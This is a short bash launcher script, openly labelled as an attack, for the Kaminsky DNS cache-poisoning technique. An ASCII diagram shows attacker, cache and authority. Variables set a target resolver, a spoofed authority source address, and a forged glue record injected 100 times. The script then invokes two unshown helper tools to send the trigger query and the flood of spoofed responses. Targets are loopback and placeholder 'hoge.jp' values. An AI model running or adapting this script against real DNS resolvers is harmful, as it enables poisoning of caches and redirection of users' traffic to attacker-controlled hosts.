#!/bin/bash

# Dan Kaminsky's method attack script
# reference URL : http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html#refs
# inoue.tomoya@gmail.com
#======================================================
#           |-----------|
#           | Authority |
#           |-----------|
#                /|\
#                 |
#                 |
#                 |
#                 |
#             |------ | DST
#             | cache |<---|
#             |-------|    |
#  SERVER_ADDR   /|\       |
#                 |        |
#     wroggi      |        | iopery
# query(nx_query) |        | response(attack)
#                 |        |
#      XXX        |        |
#             |-------|    |
#             |attaker| ---|
#             |-------| SRC(Spoofing Authority Address)
#======================================================

SERVER_ADDR="127.0.0.1"
SRC="127.0.0.1"
DST="127.0.0.1"
REQ="hoge.hoge.jp"
AUTH="hoge.jp"
GLUENAME="www.hoge.jp"
GLUEADDR="127.0.0.1"
NUM_INJECT="100"

if [ -x wroggi ]; then
    #echo "exist"
    # ToDo
    # - ソースアドレスを選べるべき？
    eval "./wroggi ${REQ} ${SERVER_ADDR}"
else
    echo "Not exist the wroggi."
    exit 1
fi

if [ -x ioprey ]; then
    #echo "exist"
    eval "./ioprey -v -s ${SRC} -d ${DST} -r ${REQ} -n ${AUTH} -g ${GLUENAME} -t ${GLUEADDR} -c ${NUM_INJECT}"
else
    echo "Not exist the ioprey."
    exit 1
fi

